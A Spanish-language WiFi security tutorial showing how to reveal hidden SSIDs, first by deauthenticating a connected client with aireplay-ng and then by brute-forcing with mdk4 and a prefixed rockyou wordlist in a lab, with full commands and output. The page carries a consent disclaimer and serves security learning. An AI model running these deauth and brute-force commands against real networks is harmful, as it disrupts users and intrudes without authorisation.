
# Redes ocultas (Hidden AP)

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Método 1: Deauth clásico</mark>

### Configurar red oculta

En el panel de control del WiFi habilitar la opción "Esconder SSID":

<figure><img src="/files/yx2vDdjKYVoQvGLwYCy6" alt=""><figcaption></figcaption></figure>

No aparece en la lista de redes wifi, y al conectarnos nos muestra este mensaje:

<figure><img src="/files/UrSJcpCLh59gDwBhuZ0q" alt=""><figcaption></figcaption></figure>

### Detectar red con el SSID oculto

```bash
# 1 - Apagamos el adaptador wlan0
ifconfig wlan0 down

# 2 - Iniciamos airmon-ng
sudo airmon-ng start wlan0

# 3- Encontrar al objetivo
sudo airodump-ng wlan0

CH  1 ][ Elapsed: 1 min ][ 2023-11-02 10:22 ][ paused output

 BSSID              PWR  Beacons  #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 EA:66:AB:4C:31:OA  -56       55      0    0   1  720   WPA2 CCMP   PSK  <length:  0>
                                                                        |------------|
# El ESSID <length:  0> nos indica que tiene el SSID oculto
# Dependiendo del tipo de cifrado puede mostrar el número de caracteres
```

### Ver dispositivos en una red oculta

```bash
# 4 - Iniciamos airodump-ng con el BSSID objetivo y su CHANNEL
sudo airodump-ng --bssid EA:66:AB:4C:31:OA --channel 1 wlan0

 CH  1 ][ Elapsed: 2 mins ][ 2023-11-02 10:38 ][ paused output

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 EA:66:AB:4C:31:EA  -53  48      307       57    0   1  720   WPA2 CCMP   PSK  <length:  0>
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 EA:66:AB:4C:31:OA  CE:C1:C0:DB:DF:1F  -15    0 -24      0      402
                   |-----------------|
```

### Ataque: Desvelar SSID

Debemos realizar un deauth a algún dispositivo de la red para que desvele el SSID en la reconexión:

```bash
# Solamente necesitamos enviar 1 paquete para este ataque
sudo aireplay-ng --deauth 1 -a EA:66:AB:4C:31:OA -c CE:C1:C0:DB:DF:1F wlan0

10:44:28  Waiting for beacon frame (BSSID: EA:66:AB:4C:31:EA) on channel 1
10:44:28  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|62 ACKs]
10:44:29  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|63 ACKs]
10:44:29  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 4|59 ACKs]
10:44:30  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [38|59 ACKs]
10:44:31  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [43|60 ACKs]
10:44:31  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [47|62 ACKs]
10:44:32  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [43|60 ACKs]
10:44:32  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [12|85 ACKs]
10:44:33  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 6|63 ACKs]
10:44:33  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|60 ACKs]
10:44:34  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|61 ACKs]
10:44:34  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|63 ACKs]
10:44:35  Sending 64 directed DeAuth (code 7). STMAC: [CE:C1:C0:DB:DF:1F] [ 0|62 ACKs]
```

```bash
 CH  1 ][ Elapsed: 10 mins ][ 2023-11-02 10:46 ][ paused output

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 EA:66:AB:4C:31:EA  -49  58     2885      290    0   1  720   WPA2 CCMP   PSK  INHACKEABLE                                                                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 EA:66:AB:4C:31:OA  CE:C1:C0:DB:DF:1F  -61    1e- 1      0     3899  EAPOL  INHACKEABLE  
```

{% hint style="success" %}
Como podemos ver ahora si se muestra el SSID de la red.
{% endhint %}

***

## <mark style="color:purple;">Método 2: MDK4 Bruteforce</mark>

Necesitamos el BSSID del punto de acceso con el ESSID oculto, por lo que debemos conocer su canal y BSSID. Como no hay clientes, debemos realizar un ataque de fuerza bruta con una lista de posibles ESSID.&#x20;

En este ejemplo de un laboratorio de Wifi Challenge Lab, tenemos el siguiente listado de redes WiFI:

```bash
sudo airodump-ng wlan0mon -w scan --manufacturer --wps --band abg

 CH 155 ][ Elapsed: 12 s ][ 2026-04-25 15:20 ][ paused output

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID                 MANUFACTURER

 F0:9F:C2:71:22:1A  -25        5        0    0  44   54e  WPA2 CCMP   MGT  0.0    wifi-corp             Ubiquiti Networks
 F0:9F:C2:7A:33:28  -25        5        0    0  44   54e  WPA2 CCMP   MGT  0.0    wifi-regional-tablets Ubiquiti Networks
 F0:9F:C2:71:22:17  -25        5       10    0  44   54e  WPA2 CCMP   MGT  0.0    wifi-global           Ubiquiti Networks
 F0:9F:C2:71:22:16  -25        5        0    0  44   54e  WPA2 CCMP   MGT  0.0    wifi-regional         Ubiquiti Networks
 F0:9F:CB:3F:BC:27  -25        5        0    0  44   54   WPA2 CCMP   MGT  0.0    wifi-corp-legacy      Unknown          
 F0:9F:C2:71:AF:2F  -25        5        0    0  44   54   WPA3 CCMP   OWE  0.0    wifi-gratis           Ubiquiti Networks
 F0:9F:C2:71:22:15  -25        5        0    0  44   54e  WPA2 CCMP   MGT  0.0    wifi-corp             Ubiquiti Networks
 8E:E0:9C:6F:D4:6D  -28        2        0    0   6   54   WPA2 CCMP   PSK  0.0    MiFibra-5-D6G3        Unknown          
 F0:9F:C2:71:22:10  -28        2        2    0   6   54   OPN              0.0    wifi-guest            Ubiquiti Networks
 F0:9F:C2:71:22:12  -28        2        2    0   6   54   WPA2 CCMP   PSK  0.0    wifi-mobile           Ubiquiti Networks
 CE:60:C6:C9:25:AB  -28        2        0    0   9   54   WPA2 CCMP   PSK  0.0    vodafone7123          Unknown          
 CE:A2:E1:43:19:69  -28        5        0    0   3   54   WPA2 CCMP   PSK  0.0    MOVISTAR_JYG2         Unknown          
 F0:9F:C2:71:22:11  -28        5      101    0   3   54   WEP  WEP         0.0    wifi-old              Ubiquiti Networks
 F0:9F:C2:71:22:13  -28        3        0    0   8   54   WPA2 CCMP   PSK  2.0    wifi-event            Ubiquiti Networks
 92:10:C6:89:3A:9A  -28        3        0    0  11   54   WPA2 CCMP   PSK  0.0    WIFI-JUAN             Unknown          
 F0:9F:C2:6A:88:26  -28        3        0    0  11   54   OPN              0.0    <length:  9>          Ubiquiti Networks
<----SNIP---->
```

Observamos que la última red no tiene ESSID, solo nos indica la longitud: `<length:  9>`

Viendo el resto de redes WiFi al alcance podemos suponer que la red tendrá el mismo profijo que el resto de redes: `wifi-`

Una vez que tengamos esta información, debemos modificar el diccionario habitual (rockyou) incluyendo el prefijo “`wifi-`”, como en el resto de los APs.

### Modificar Rockyou con prefijos

El siguiente comando incluirá `wifi-` delante de cada una de las palabras del diccionario y lo copiará a un diccionario nuevo `wifi-rockyou.txt`:

```bash
cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ~/wifi-rockyou.txt
```

```bash
cat wifi-rockyou.txt

wifi-prince20
wifi-prince1999
wifi-primus1
wifi-primrose1
wifi-primor
wifi-primix
wifi-primitive
wifi-primadona
wifi-pricky
wifi-prickles
wifi-pretyy
wifi-prettyjen
<----SNIP---->
```

### Bruteforce con MDK4

```bash
airmon-ng start wlan0             # Activar modo monitor
iwconfig wlan0mon channel 11      # Bloquear canal 11 (el del objetivo)
```

```bash
root@WiFiChallengeLab:~# mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f wifi-rockyou.txt

Waiting for a beacon frame from target to get its SSID length.
SSID length is 9
Trying SSID: wifi-love                                           
Packets sent:      1 - Speed:    1 packets/sec
Probe Response from target AP with SSID wifi-free                
Job's done, have a nice day :)
```

Obtenemos el nombre de la red oculta: `wifi-free`
